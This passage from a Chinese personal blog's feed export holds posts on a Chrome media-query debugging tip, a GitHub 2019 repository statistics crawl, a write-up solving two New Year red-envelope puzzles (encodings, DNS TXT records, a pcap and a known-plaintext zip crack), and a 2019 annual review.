}\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了...），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的...尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>............................................________-....................................-.---......</li>\n<li>----------------------------------------------------------------------------------------------------</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>...创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的...</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene - Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛...三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24x3 的网格，结合第二条提示“24x3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年...写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇...），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" 